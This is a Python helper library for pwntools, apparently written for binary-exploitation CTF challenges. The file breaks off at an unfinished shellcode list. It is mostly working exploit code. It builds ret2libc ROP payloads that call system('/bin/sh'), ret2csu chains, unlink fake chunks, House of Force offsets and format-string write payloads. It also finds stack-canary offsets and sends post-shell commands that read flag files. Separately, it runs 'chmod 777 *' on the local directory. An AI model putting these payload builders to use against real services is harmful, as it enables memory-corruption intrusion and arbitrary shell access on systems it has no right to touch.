"""
@author: 不离
@date: 2023-4-24
Pwntools-External Functions Library
"""

import os
import ctypes
import glob
import random
import re
from enum import Enum
from typing import Any, Literal, Optional, Tuple

from pwn import *
from LibcSearcher import *


__version__ = '1.10'

RESET = '\x1b[0m'


def random_color():
    """生成随机颜色的 ANSI 代码。"""
    return f'\x1b[01;38;5;{random.randint(1, 255)}m'


def _colorful_print(msg, color = None):
    if color is None:
        color = random_color()

    print(f"{color}{msg}{RESET}")


def init_watch_list(*args, **kwargs):
    global socketStatus, segments, globalPtrs

    if socketStatus == SocketStatus.Remote:
        return

    _get_segment_base_addresses()

    i = 0
    while i < len(args):
        arg = args[i]
        if i + 1 < len(args) and isinstance(args[i + 1], str) and args[i + 1] in segments:
            segment_name = args[i + 1]
            base_address = segments[segment_name]
            if isinstance(arg, str):
                final_address = _sym_addr_internal(arg)
                globalPtrs[arg] = final_address
            elif isinstance(arg, int):
                final_address = base_address + arg
                globalPtrs[hex(arg)] = final_address
            else:
                print(f"Unknown argument type: {type(arg)}")
            i += 2
        else:
            print(f"Argument '{arg}' without valid segment name")
            i += 1

    for key, value in kwargs.items():
        if key in segments:
            base_address = segments[key]
            if isinstance(value, str):
                symbol_address = _sym_addr_internal(value)
                final_address = base_address + symbol_address
                globalPtrs[value] = final_address
            elif isinstance(value, int):
                final_address = base_address + value
                globalPtrs[hex(value)] = final_address
            else:
                print(f"Unknown value type for keyword argument '{key}': {type(value)}")
        else:
            print(f"Unknown keyword argument '{key}'")

    show_watch_list()


def show_watch_list():
    global globalPtrs

    if socketStatus == SocketStatus.Remote:
        return
    
    color = random_color()

    _colorful_print("==================== WATCH LIST ====================", color)

    if not globalPtrs:
        print("No entries in the watch list.")
    else:
        for key, value in globalPtrs.items():
            _colorful_print(f"Key: {key:<20} Address: {hex(value):>17}", color)

    _colorful_print("==================== WATCH LIST ====================", color)


def get_seg_addr(arg):
    """
    使用 /proc/pid/maps 获取各项地址
    
    Args:
        arg: 段名称 如 libc

    Returns:
        addr: 段起始地址
    """
    global arenaAddr, segments, socketStatus, libcBaseAddress

    color = random_color()

    if socketStatus == SocketStatus.Local:
        _colorful_print("============NOTE============", color)
        _colorful_print("Please DO NOT use get_seg_addr() outside of local or without leaking the Libc Base Address.", color)
        _colorful_print("This is for DEBUG use only.", color)
        _colorful_print("============NOTE============", color)

        _get_segment_base_addresses()

        if arg.lower() not in segments:
            raise ValueError(f"Invalid segment name: {arg}. Available segments: {', '.join(segments.keys())}")

        if arg.lower() == "libc":
            if libcBaseAddress is not None and libcBaseAddress != segments[arg] and arenaAddr != None:
                _colorful_print("============WARNING============", color)
                _colorful_print("Current Libc Base Address was not Libc Base Address.", color)
                _colorful_print(f"Current: {hex(libcBaseAddress)}", color)
                _colorful_print(f"Correct: {hex(segments[arg])}", color)
                _colorful_print(f"Offset: (Arena Offset with Correct Libc Base): {hex(arenaAddr - segments[arg])}", color)
                _colorful_print("============WARNING============", color)
                set_libc_base(segments[arg])

                return segments[arg]
            else:
                return segments[arg]

        else:
            return segments[arg]
    else:
        _colorful_print("You're using get_seg_addr() in a non-local environment. Skipping...", color)
        return None


def _get_segment_base_addresses():
    global binaryElfFilePath, segments

    if segments is not None:
        fileName = binaryElfFilePath.strip("./")

        result = _get_segments_base_addr()

        result = result.split("\n")
        code_flag = 0
        libc_flag = 0
        ld_flag = 0

        for r in result:
            rc = re.compile(r"^([0-9a-f]{6,14})-([0-9a-f]{6,14})", re.S)
            rc = rc.findall(r)
            if len(rc) != 1 or len(rc[0]) != 2:
                continue
            start_addr = int(rc[0][0], base=16)
            end_addr = int(rc[0][1], base=16)
            if (fileName is not None) and (not code_flag) and r.endswith(fileName):
                code_flag = 1
                segments['code'] = start_addr
            elif (not libc_flag) and ("/libc" in r):
                libc_flag = 1
                segments['libc'] = start_addr
            elif (not ld_flag) and ("/ld" in r):
                ld_flag = 1
                segments['ld'] = start_addr
            elif "heap" in r:
                segments['heap'] = start_addr
            elif "stack" in r:
                segments['stack'] = start_addr  
            elif "vdso" in r:
                segments['vdso'] = start_addr
    else:
        return segments


def _get_segments_base_addr():
    global ioStream

    pid = ioStream.proc.pid

    command = f"cat /proc/{pid}/maps"

    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = result.communicate()
    return stdout


def init_ctypes_srand():
    global ctypesElf
    try:
        ctypesElf = ctypes.CDLL("/usr/lib/x86_64-linux-gnu/libc.so.6")
        ctypesElf.srand.argtypes = [ctypes.c_uint]
    except OSError as e:
        ctypesElf = None
        raise OSError(f"Error loading libc.so.6: {e}")


def _patch_elf():
    """
    自动替换二进制文件的 Libc 文件为 load_libc() 函数的参数

    当已被替换时，直接返回
    当 Libc 文件路径为 Null 时也直接返回
    """
    global binaryElfFilePath, libcElfFilePath

    if _check_binary_file(libcElfFilePath) == CheckStatement.Null:
        return

    tempPath = os.path.dirname(libcElfFilePath)
    pattern = os.path.join(tempPath, 'ld*.so')
    ldFiles = glob.glob(pattern)

    command = f"replace-elf {ldFiles[0]} {libcElfFilePath} {binaryElfFilePath}"

    result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    stdout, stderr = result.communicate()

    recv = os.popen(f"ldd {binaryElfFilePath}").read()

    if libcElfFilePath in recv:
        return

    if "错误" in stdout:
        file = binaryElfFilePath.strip('./')
        os.system(f"killall {file}")
        _patch_elf()

    raise RuntimeError("Libc Replaced. Please restart the program.")


def get_time_seed(arg):
    """
    基于给入的时间获取随机数种子

    Args:
        arg: 时间

    Returns:
        seed: 随机数种子
    """
    global ctypesElf

    try:
        _check_binary_file(ctypesElf)
    except Exception:
        init_ctypes_srand()

    seed = ctypesElf.time(arg)

    return seed


def get_random(seed):
    """
    基于给入的种子生成随机数

    Args:
        seed: 随机数种子

    Returns:
        num: 随机数
    """
    global ctypesElf

    try:
        _check_binary_file(ctypesElf)
    except Exception:
        init_ctypes_srand()

    if ctypesElf is None:
        raise Exception("Failed to initialize ctypesElf. Check if libc.so.6 is available.")

    ctypesElf.srand(seed)
    return ctypesElf.rand()


def _check_io_stream(io_stream):
    """检查IO流是否有效"""
    if io_stream is None or io_stream == "":
        raise Exception("Error: Please use get_utils() first.")


def _check_libc_loaded(libc_elf):
    """检查Libc是否已加载"""
    if libc_elf is None:
        raise Exception("Error: Please use load_libc() first.")


def _check_binary_file(binary_file_path=None):
    """检查二进制文件路径是否有效"""
    if binary_file_path.upper() == "NULL":
        return CheckStatement.Null

    if not binary_file_path or not os.path.exists(binary_file_path) or binary_file_path is None:
        raise Exception("Error: Binary file path is invalid.")
    

def Byte(content: Optional[int] = None):
    if content is not None:
        return bytes(str(content).encode())
    else:
        raise ValueError("Content is invaild.")
    

def _check_protect():
    """
    打印二进制文件的保护与沙箱状态
    """
    global binaryElfFilePath

    tempFilePath = binaryElfFilePath.replace('./', '')
    tempFilePath = os.getcwd() + tempFilePath
    
    _check_binary_file(binaryElfFilePath)
    
    command_checksec = f"checksec {binaryElfFilePath}"
    command_seccomp = f"seccomp-tools dump {binaryElfFilePath}"
    
    result_checksec = subprocess.Popen(command_checksec, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    result_seccomp = subprocess.Popen(command_seccomp, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
    
    try:
        stdout_seccomp, stderr_seccomp = result_seccomp.communicate(timeout=0.2)
        result_seccomp.kill()
    except subprocess.TimeoutExpired:
        result_seccomp.kill()
        stdout_seccomp, stderr_seccomp = '', 'seccomp-tools timed out.'

    protection_info = {}

    stdout_checksec, stderr_checksec = result_checksec.communicate()
    
    protection_info['Checksec Output'] = stderr_checksec.strip()
    protection_info['Seccomp Output'] = stdout_seccomp.strip()

    color = random_color()

    os.system("killall seccomp-tools")

    _colorful_print("=============================================", color)
    for key, value in protection_info.items():
        _colorful_print(f"{key}: {value}", color)
    _colorful_print("=============================================", color)


def get_libc_base_by_arena(addr: int) -> int:
    """
    基于 main_arena 与 __malloc_hook 的偏移计算出 Libc 基址

    Args:
        addr: 泄漏得到的 main_arena 地址

    Returns:
        libcBaseAddress: Libc 基址
    """
    global arch, arenaAddr, arenaFlag, libcBaseAddress, libcElf, libcElfFilePath, libcVersion, socketStatus

    _check_binary_file(libcElfFilePath)
    _check_libc_loaded(libcElf)

    arenaAddr = addr
    rand_val = random_color()

    try:
        if socketStatus == SocketStatus.Local:
            libc_base = get_seg_addr('libc')
            offset = addr - libc_base

            _colorful_print("===================DEBUG-USE-ONLY===================", rand_val)
            _colorful_print(f"Main arena offset based on local debug: {hex(offset)}.", rand_val)
            _colorful_print("===================DEBUG-USE-ONLY===================", rand_val)
            arenaFlag = True

            set_libc_base(libc_base)
            return libc_base

        else:
            try:
                libcBaseAddress = addr - libcElf.sym['__malloc_hook']
                libcBaseAddress = libcBaseAddress & 0xFFFFFFFFFFFFF000
                set_libc_base(libcBaseAddress)
                arenaFlag = True

                return libcBaseAddress
            except ValueError:
                offset = libcElf.sym['__malloc_hook'] - libcElf.sym['__relloc_hook']
                main_arena_offset = libcElf.sym['__malloc_hook'] + offset * 2
                libcBaseAddress = libcBaseAddress - main_arena_offset
                libcBaseAddress = libcBaseAddress & 0xFFFFFFFFFFFFF000
                set_libc_base(libcBaseAddress)
                arenaFlag = True

                return libcBaseAddress
    except:
        raise Exception(f"Unknown Error. Based on the offset, {libcBaseAddress} is the libc base address.")


def load_libc(binary: Optional[str] = None, forceLoad: Optional[bool] = False) -> Optional[ELF]:
    """
    加载指定的 Libc 文件。

    Args:
        binary (str): Libc 文件路径。

    Returns:
        ELF: 加载的 Libc ELF 对象，如果未提供路径则返回 None。
    """
    global arch, libcElf, libcElfFilePath, socketStatus

    if _check_binary_file(binary) is CheckStatement.Null:
        _colorful_print("No Libc file provided, Considering running at no libc mode.")
        return

    libcElfFilePath = binary

    if not forceLoad:
        tempArch = _check_if_file_is_x64(libcElfFilePath)

        if tempArch == Arch.Null:
            raise Exception(f"Libc Arch is NULL.")
        
        if tempArch is not arch:
            raise Exception(f"Select libc file was not pairing with the elf file. Binary file arch: {arch}, Libc file arch: {tempArch}")

    _get_libc_version(libcElfFilePath)
    libcElf = ELF(binary)
    
    if socketStatus == SocketStatus.Local and not forceLoad:
        _patch_elf()

    return libcElf


def _get_libc_version(filePath):
    """
    获取 Libc 版本
    通常不会直接调用，内部自动调用。
    """
    global libcVersion, libcUbuntuVersion

    pattern = r'(\d+\.\d+)-(\S+)\s*\)'
    command = f"strings {filePath} | grep 'GNU C Library'"
    result = subprocess.run(command, shell=True, capture_output=True, text=True)
    match = re.search(pattern, result.stdout)
    if match:
        libcVersion = match.group(1)
        libcUbuntuVersion = match.group(2)
    else:
        print(f"UNKNOWN Libc type: {result.stdout}.")


def _calculate_libc_base(addr: int, name: str) -> int:
    """
    计算 Libc 基址。

    Args:
        addr (int): 泄漏函数地址。
        name (str): 泄漏函数名称。

    Returns:
        int: Libc 基址。
    """
    global libcBaseAddress, libcElf
    _check_libc_loaded(libcElf)

    libcBaseAddress = addr - libcElf.sym[name]
    return libcBaseAddress


def calc_house_of_force_offset(targetAddr: int, topChunk: int) -> int:
    """
    懒人计算 House of Force 偏移地址。

    Offset = TargetAddr - 0x20 - CurrenntTopChunkAddr

    Args:
        targetAddr (int): 想劫持的地址
        topChunk (str): 当前 Top Chunk 地址

    Returns:
        int: 偏移
    """
    offset = targetAddr - 0x20 - topChunk
    _colorful_print(f"The offset of House of Force to hijack {hex(targetAddr)} is {hex(offset)}")

    return offset

def search_one_gadget(index=0):
    """
    获取 One_Gadget 地址。

    Args:
        index: (int) 获取第 N 个 One_Gadget 的地址。

    Returns:
        one_gadget_offset
    """
    global libcElf, libcElfFilePath

    color = random_color()
    _check_libc_loaded(libcElf)

    os.chdir(os.getcwd())
    recv = os.popen('one_gadget ' + libcElfFilePath).read()
    regex = re.compile(r'([0x0-9a-fA-F]+)\s+exec')
    ogs = re.findall(regex, recv)
    one_gadget_list = []
    for i in ogs:
        _colorful_print(f"One_Gadget Found =======> [{i}]", color)
        one_gadget_list.append(i)
    if index < len(one_gadget_list):
        _colorful_print(f"Selected the {index + 1} One_gadget. ============> Offset: {hex(int(one_gadget_list[index], 16))}", color)
        return int(one_gadget_list[index], 16)
    return None


def UnlinkChunkPayloadGenerator(chunkSize, nextChunkSize, chunkFd, chunkBk):
    """
    懒人生成 Unlink Fake Chunk Payload
    只适用于向前合并。

    Args:
        chunkSize: 伪造 Chunk 的大小
        nextChunkSize: 伪造 Chunk 下一个 Chunk 的大小
        chunkFd: 伪造 Chunk 的 FD 指针
        chunkBk: 伪造 Chunk 的 BK 指针

    Returns:
        Payload
    """
    if chunkSize is None or nextChunkSize is None or chunkFd is None or chunkBk is None:
        raise ValueError("Invaild paramater, Please fill all the blank.")

    if chunkSize < 0x30:
        raise ValueError(f"Invaild fake chunk size: {chunkSize}")

    Payload = p64(0) + p64(chunkSize)
    Payload += p64(chunkFd) + p64(chunkBk)
    Payload += p64(0) * int((chunkSize - 0x20) / 8)
    Payload += p64(chunkSize) + p64(nextChunkSize)

    _colorful_print(f"Generating Fake Chunk Payload with size: {hex(chunkSize)}, Next chunk size: {hex(nextChunkSize)}.")

    return Payload


def get_libc_base(name: str, addr: int) -> int:
    """
    获取 Libc 基址

    Args:
        name: 泄漏符号名
        addr: 泄漏地址 

    Returns:
        libc 基址
    """
    global libcBaseAddress, libcElf

    _check_libc_loaded(libcElf)
    
    libcBaseAddress = _calculate_libc_base(addr, name)

    set_libc_base(libcBaseAddress)

    return libcBaseAddress


def search_reg_gadgets(reg=None):
    """
    获取输入的寄存器相关 Gadgets

    Args:
        reg: (string) 如 ret, pop rdi;

    Returns:
        reg_offset
    """
    global binaryElf, binaryElfFilePath

    os.chdir(os.getcwd())

    _check_binary_file(binaryElfFilePath)
    if reg is None:
        raise Exception("Please specify a register.")

    command = f'ROPgadget --binary {binaryElfFilePath} | grep "{reg}"'
    recv = os.popen(command).read()

    unique_gadget = None
    for line in recv.splitlines():
        line = line.strip()
        if reg == 'ret':
            match = re.search(rf'^(0x[0-9a-f]+) : {reg}\s*(;)?$', line)
        else:
            match = re.search(rf'^(0x[0-9a-f]+) : ({re.escape(reg)})( ; ret)?$', line)

        if match:
            if unique_gadget is None:
                _colorful_print(f"Gadget Found =======> [{match.group()}]")
                unique_gadget = int(match.group(1), 16)
                break

    return unique_gadget


def sym_addr(sym=None):
    """
    懒人获取一系列 Libc 符号地址，使用本地 Libc 文件进行搜索。
    若想获取云端地址，请使用 libc_search 函数。
    默认返回 libc_base, system, binsh ，若 sym 有定义则返回 sym 的地址。

    Args:
        sym:  需要获取的符号

    Returns:
        libc_base, system, binsh | sym_addr
    """
    global libcBaseAddress, libcElf
    _check_libc_loaded(libcElf)

    if libcBaseAddress == None:
        raise Exception("Please use get_libc_base() first.")
    
    if sym == None:
        system = libcBaseAddress + libcElf.sym['system']
        binsh = libcBaseAddress + next(libcElf.search(b'/bin/sh\x00'))
        
        return libcBaseAddress, system, binsh
    else:
        sym_addr = libcBaseAddress + libcElf.sym[sym]

        return sym_addr


def _sym_addr_internal(sym=None):
    global libcElf, segments
    _check_libc_loaded(libcElf)
    
    sym_addr = segments['libc'] + libcElf.sym[sym]

    return sym_addr


def Ret2Csu(payload, r12, rdi, r14, r13, csu_front, csu_rear, syscallAddr):
    """
    快捷 CSU Payload
    Csu Front 是连续一系列出栈的 Gadget | push r15; push r14
    Csu Rear  是连续一系列入栈的 Gadget | pop rbx; pop rbp

    Args:
        payload:        前置 Payload 送入 /bin/sh 字符串，修改系统调用号为 59
        r12;            R12 寄存器  |   从哪开始执行 call [r12+rbx*8]
        rdi:            RDI 寄存器  |   /bin/sh 字符串地址 一参
        r14:            R14 寄存器  |   RSI 寄存器 二参
        r13:            R13 寄存器  |   RDX 寄存器 三参
        csu_rear:       后置 Csu Gadget 地址 pop rbx; pop rbp
        csu_front:      前置 Csu Gadget 地址 push r15; push r14
        syscallAddr:    syscall 地址，用来执行 Csu 调用
    """
    global ioStream

    _check_io_stream(ioStream)

    rdi_addr = search_reg_gadgets('pop rdi')

    payload_internal = payload
    payload_internal += p64(csu_rear)
    payload_internal += p64(0) # RBX
    payload_internal += p64(1) # RBP
    payload_internal += p64(r12) # Execute Addr
    payload_internal += p64(r13)
    payload_internal += p64(r14)
    payload_internal += p64(0) # R15
    payload_internal += p64(csu_front)
    payload_internal += cyclic(0x38)
    payload_internal += p64(rdi_addr)
    payload_internal += p64(rdi)
    payload_internal += p64(syscallAddr)

    ioStream.sendline(payload_internal)


def set_libc_base(addr=None):
    """
    设置 Libc 基址
    一般在堆题用得到，因为没办法直接使用符号获取地址。

    Args:
        addr (int): Libc 基址
    """
    global libcElf, libcBaseAddress

    _check_libc_loaded(libcElf)

    if addr is None or hex(addr)[-2:] != '00':
        raise ValueError(f"Invalid Libc base addr: {hex(addr) if addr else 'None'}.")

    libcBaseAddress = addr
    _colorful_print(f"Libc Base Address has been set to {hex(libcBaseAddress)}.")


def leak_addr(i=None):
    """
    获取泄露的内存地址。

    Args:
        i (int): 用于指定地址获取方式的参数。可以是0、1或2。0是32位，1是64位正向接收，2是64位反向接收，3是直接接收8位。

    Returns:
        int: 返回获取到的内存地址。
    """
    global ioStream

    _check_io_stream(ioStream)

    internal = 0

    if i == None:
        if arch == Arch.x64:
            internal = 2
        if arch == Arch.x86:
            internal = 0
    else:
        internal = i

    address_methods = {
        0: lambda: u32(ioStream.recvuntil(b'\xf7')[-4:]),
        1: lambda: u64(ioStream.recvuntil(b'\x7f')[:6].ljust(8, b'\x00')),
        2: lambda: u64(ioStream.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00')),
        3: lambda: u64(ioStream.recv(8)),
        4: lambda: u32(ioStream.recv(4)),
        5: lambda: u32(ioStream.recvuntil(b'\xff')[-4:]),
    }

    return address_methods[internal]()


def libc_search(func, addr_i, onlineMode=False):
    """
    在没有提供Libc版本时，这个参数可以快捷的使用LibcSearcher获取常用函数地址。

    Args:
        func: 泄露的函数
        addr_i: 泄露的函数的地址
        onlineMode: 在线搜索还是在本地Libc库搜索

    Returns:
        int: libc_base, system, /bin/sh 的地址。
    """
    libc_i = LibcSearcher(func, addr_i, online=onlineMode)
    libc_base_i = addr_i - libc_i.dump(func)
    return libc_base_i, libc_base_i + libc_i.dump('system'), libc_base_i + libc_i.dump('str_bin_sh')


def debug(breakpoint=None):
    """
    快捷GDB Attach函数。

    Args:
        breakpoint: 断点地址
    """
    global ioStream

    _check_io_stream(ioStream)

    if breakpoint is not None:
        gdb.attach(ioStream, gdbscript='{}'.format(breakpoint))
    else:
        gdb.attach(ioStream)
    pause()


def recv_int_addr(num=16):
    """
    获取泄露的Int地址，一般是格式化字符串泄露Canary等。

    Args:
        num: 需要接收几位数字
        format: 数字的进制，默认为十进制

    Returns:
        int: Int地址的十进制格式。
    """
    global ioStream
    _check_io_stream(ioStream)

    received = ioStream.recv(num)

    try:
        return int(received)
    except ValueError:
        if received.startswith(b'0x'):
            return int(received, 16)
        else:
            raise


def decode_with_null_replacement(data):
    decoded_str = ""
    for byte in data:
        if 32 <= byte <= 126 or byte == 10:
            decoded_str += chr(byte)
    return decoded_str


def send_utils():
    """
    懒人构建 GetShell 后操作。
    """
    global ioStream

    _check_io_stream(ioStream)

    recv = f'{random_color()}============Summary============\n'
    
    commands = [
        "find '/flag.txt' -exec cat {} \;",
        "find '/flag' -exec cat {} \;",
        "uname -a"
    ]

    ioStream.recvlines(timeout=0.5)

    for command in commands:
        ioStream.sendline(command.encode())
        recv_data = ioStream.recvline()
        recv += decode_with_null_replacement(recv_data)
    
    recv += f'==============================={RESET}\n'
    print(recv)


def payload_generator(paddingSize=None, stackAligned: Optional[bool] = None, canary: Optional[bool] = None, ):
    """
    懒人构建 Payload
    目前只有 GetShell 的 Payload

    Args:
        paddingSize: 垃圾数据大小
        stackAligned: 栈对齐，默认关闭
        canary: Canary 数据

    Returns:
        payload: 最终 Payload
    """
    global arch, libcBaseAddress

    if libcBaseAddress is None:
        raise Exception("Please use set_libc_base() first.")
    
    if paddingSize is None:
        raise Exception("Please input paddingSize argument.")
    
    rdi = search_reg_gadgets('pop rdi')
    useless, system, binsh = sym_addr()
    payload = cyclic(paddingSize)
    stackAligned_i = False

    color = random_color()

    if stackAligned is None:
        if float(libcVersion) >= 2.27 and arch == Arch.x64:
            _colorful_print(f"Libc version {libcVersion}, No Stack Aligned argument, Assuming Stack Aligned.", color)
            stackAligned_i = True
    else:
        stackAligned_i = stackAligned

    if canary is not None:
        if hex(canary)[-2:] != '00':
            raise RuntimeError(f"The input Canary {hex(canary)} is invalid.")
        payload += p64(canary) if arch == Arch.x64 else p32(canary)
        payload += p64(0xdeadbeef) if arch == Arch.x64 else p32(0xdeadbeef)

    if arch == Arch.x64:
        ret = search_reg_gadgets('ret') if stackAligned_i else None
        if stackAligned_i:
            _colorful_print(f"========== Generating Payload with Canary: {canary is not None} Stack Aligned: {stackAligned_i} for x64. ==========", color)
            payload += p64(ret) + p64(rdi) + p64(binsh) + p64(system)
        else:
            _colorful_print(f"========== Generating Payload with Canary: {canary is not None} Stack Aligned: {stackAligned_i} for x64. ==========", color)
            payload += p64(rdi) + p64(binsh) + p64(system)
    else:
        _colorful_print("========== Generating Payload for x86. ==========", color)
        payload += p32(system) + p32(0xdeadbeef) + p32(binsh)

    return payload


def show_addr(msg, *args, **kwargs):
    """
    打印地址。

    Args:
        msg: 在打印地址前显示的文本
        *args: 需要打印的内存地址
        **kwargs: 需要打印的内存地址
    """
    hex_color = '\x1b[01;38;5;110m'

    _colorful_print(msg, color)

    for arg in args:
        hex_text = hex(arg)
        _colorful_print(f"============> {hex_text}", hex_color)

    for key, value in kwargs.items():
        hex_text = hex(value)
        _colorful_print(f"============> {key}: {hex_text}", hex_color)


def _check_if_file_is_x64(filePath=None):
    if filePath == None or filePath == '':
        raise Exception(f"The input filepath {filePath} is invaild.")

    pattern = r'ELF (\d+)-bit'
    recv = os.popen('file ' + filePath).read()
    match = re.search(pattern, recv)

    if match:
        if match.group(1) == '64':
            return Arch.x64
        else:
            return Arch.x86
    else:
        return Arch.Null


def init_env(loglevel='debug', arch_i=None):
    """
    初始化环境，默认为 amd64, debug 级日志打印。

    Args:
        log_level: 日志打印等级
        arch: 系统架构，1表示64位，0表示32位
    """
    global arch, binaryElfFilePath, socketStatus

    _check_binary_file(binaryElfFilePath)

    arch = _check_if_file_is_x64(binaryElfFilePath)

    if arch_i == None and arch == Arch.Null:
        raise Exception("Please set arch first.")

    if arch_i == 1 or arch == Arch.x64:
        context(arch='amd64', os='linux', log_level=loglevel)
    elif arch_i == 0 or arch == Arch.x86:
        context(arch='i386', os='linux', log_level=loglevel)

    _colorful_print(f"Arch: x86_64, OS: {subprocess.check_output('uname', shell=True).decode().strip()}, Socket Status: {socketStatus}")


def init_global_var():
    global arenaAddr, arenaFlag, binaryElf, binaryElfFilePath, libcBaseAddress, libcElf, libcElfFilePath, libcUbuntuVersion, libcVersion, ioStream, arch, ctypesElf, socketStatus, segments, globalPtrs, colorTime, lastColor
    
    arenaAddr = None
    arenaFlag = False
    binaryElf = None
    binaryElfFilePath = None
    libcBaseAddress = None
    libcElf = None
    libcElfFilePath = None
    libcUbuntuVersion = None
    libcVersion = None
    ioStream = None
    arch = Arch.Null
    ctypesElf = None
    socketStatus = SocketStatus.Null
    segments = {}
    globalPtrs = {}
    colorTime = 0
    lastColor = None


def get_utils(binary: Optional[str] = None, local: bool = True, ip: Optional[str] = None, port: Optional[int] = None) -> Tuple[Optional[tube], Optional[ELF]]:
    """
    快速获取IO流和ELF。

    Args:
        binary: 二进制文件
        local: 布尔值，本地模式或在线
        ip: 在线IP
        port: 在线Port

    Returns:
        io: IO流
        elf: ELF引用
    """
    init_global_var()

    os.chdir(os.getcwd())
    os.system("chmod 777 *")

    global binaryElf
    global binaryElfFilePath
    global ioStream
    global socketStatus

    binaryElfFilePath = binary  if binary is not None else "NULL"
    binaryElf = ELF(binary) if binary is not None else "NULL"

    if not local:
        ioStream = remote(ip, port)
        socketStatus = SocketStatus.Remote
    else:
        if _check_binary_file(binaryElfFilePath) is CheckStatement.Null:
            raise Exception("No binary file and no remote socket provided. This is invaild.")
        _check_protect()
        ioStream = process(binary) if binary is not None else "NULL"
        socketStatus = SocketStatus.Local

    return ioStream, binaryElf


def fmt_canary():
    """
    快速获取Canary，仅支持格式化字符串漏洞。
    本函数通过本地穷举，节省人工计算的时间。
    仅支持简单题目。

    Returns:
        string: 一句关于偏移的字符串。
    """
    global binaryElfFilePath

    _check_binary_file(binaryElfFilePath)

    i = 1

    pattern = re.compile(r'0x[0-9a-fA-F]{14}00.*')

    while True:
        io = process(binaryElfFilePath)

        payload = b'%' + str(i).encode() + b'$p'

        io.sendline(payload)
        try:
            recv = io.recvline().decode()
            if '(nil)' in recv:
                i = i + 1
                continue
            elif '0x' in recv:
                matches = pattern.findall(recv)
                if matches:
                    _colorful_print(f"Canary's offset is at ===========> {str(i)} ({str('%' + str(i) + '$p')})")
                    return
                else:
                    i = i + 1
                    continue

        except():
            i = i + 1
            continue


def fmtstraux(size: Optional[int] = 10) -> Optional[int]:
    """
    快速获取格式化字符串对应的偏移。

    Args:
        size (int): 几个%p，默认为10。
    """
    global ioStream
    global arch

    _check_io_stream(ioStream)

    if size is None:
        size = 10

    strsize = 8 if arch == Arch.x64 else 4

    Payload = b'A' * strsize + b'-%p' * size
    ioStream.sendline(Payload)
    temp = ioStream.recvall(timeout=0.2)
    pattern = re.compile(r'(0x[0-9a-fA-F]+|\(nil\))(?:-|$)')
    matches = pattern.findall(temp.decode())

    if matches:
        position = 0
        for match in matches:
            if match == '(nil)':
                position += 1
            else:
                position += 1
                hex_value = match[2:] if match.startswith('0x') else match
                
                if arch == Arch.x64:
                    if '41414141' in hex_value:
                        _colorful_print(f"Found offset at {position}.")
                        return
                elif arch == Arch.x86:
                    if '41414' in hex_value:
                        _colorful_print(f"Found offset at {position}.")
                        return

        raise Exception("Offset not found. Please increase the size or check manually.")
    else:
        raise Exception("Unknown Error.")


def fmtgen(character=None, size=None, num=None, separator=None):
    """
    快速生成格式化字符串所需Payload。

    Args:
        character: 使用什么字符 默认p
        size: 几个打印，默认为10
        num: 从哪开始，默认为1
        separator: 用什么作为分隔符，默认-
    """
    if character is None:
        character = b'p'

    if size is None:
        size = 10

    if num is None:
        num = 1

    if separator is None:
        separator = b'-'

    payload_str = b''

    for i in range(num, num + size):
        payload_str += b'%' + str(i).encode() + b'$' + character + separator

    payload_str = payload_str[:-1]

    return payload_str.decode()


def fmtstr_payload_64(offset, writes, numbwritten=0, write_size='byte'):
    """
    Pwntools fmtstr_payload for x64.
    函数来源：安洵杯出题人。
    """
    config = {
        32 : {
            'byte': (4, 1, 0xFF, 'hh', 8),
            'short': (2, 2, 0xFFFF, 'h', 16),
            'int': (1, 4, 0xFFFFFFFF, '', 32)},
        64 : {
            'byte': (8, 1, 0xFF, 'hh', 8),
            'short': (4, 2, 0xFFFF, 'h', 16),
            'int': (2, 4, 0xFFFFFFFF, '', 32)
        }
    }

    if write_size not in ['byte', 'short', 'int']:
        log.error("write_size must be 'byte', 'short' or 'int'")

    number, step, mask, formatz, decalage = config[context.bits][write_size]

    payload = ""

    payload_last = ""
    for where,what in writes.items():
        for i in range(0,number*step,step):
            payload_last += pack(where+i)

    fmtCount = 0
    payload_forward = ""

    key_toadd = []
    key_offset_fmtCount = []


    for where,what in writes.items():
        for i in range(0,number):
            current = what & mask
            if numbwritten & mask <= current:
                to_add = current - (numbwritten & mask)
            else:
                to_add = (current | (mask+1)) - (numbwritten & mask)

            if to_add != 0:
                key_toadd.append(to_add)
                payload_forward += "%{}c".format(to_add)
            else:
                key_toadd.append(to_add)
            payload_forward += "%{}${}n".format(offset + fmtCount, formatz)
            key_offset_fmtCount.append(offset + fmtCount)
            #key_formatz.append(formatz)

            numbwritten += to_add
            what >>= decalage
            fmtCount += 1


    len1 = len(payload_forward)

    key_temp = []
    for i in range(len(key_offset_fmtCount)):
        key_temp.append(key_offset_fmtCount[i])

    x_add = 0
    y_add = 0
    while True:

        x_add = len1 / 8 + 1
        y_add = 8 - (len1 % 8)

        for i in range(len(key_temp)):
            key_temp[i] = key_offset_fmtCount[i] + x_add

        payload_temp = ""
        for i in range(0,number):
            if key_toadd[i] != 0:
                payload_temp += "%{}c".format(key_toadd[i])
            payload_temp += "%{}${}n".format(key_temp[i], formatz)

        len2 = len(payload_temp)

        xchange = y_add - (len2 - len1)
        if xchange >= 0:
            payload = payload_temp + xchange*'a' + payload_last
            return payload
        else:
            len1 = len2


class IO_FILE_plus_struct(FileStructure):

    def __init__(self, null=0):
        FileStructure.__init__(self, null)

    def __setattr__(self, item, value):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            object.__setattr__(self, item, value)
        else:
            error("Unknown variable %r" % item)

    def __getattr__(self, item):
        if item in IO_FILE_plus_struct.__dict__ or item in FileStructure.__dict__ or item in self.vars_:
            return object.__getattribute__(self, item)
        error("Unknown variable %r" % item)

    def __str__(self):
        return str(self.__bytes__())[2:-1]

    @property
    def _mode(self) -> int:
        off = 96
        if context.bits == 64:
            off = 192
        return (self.unknown2 >> off) & 0xffffffff

    @_mode.setter
    def _mode(self, value:int):
        assert value <= 0xffffffff and value >= 0, "value error: {}".format(hex(value))
        off = 96
        if context.bits == 64:
            off = 192
        self.unknown2 |= (value << off)


shellcode_list = {
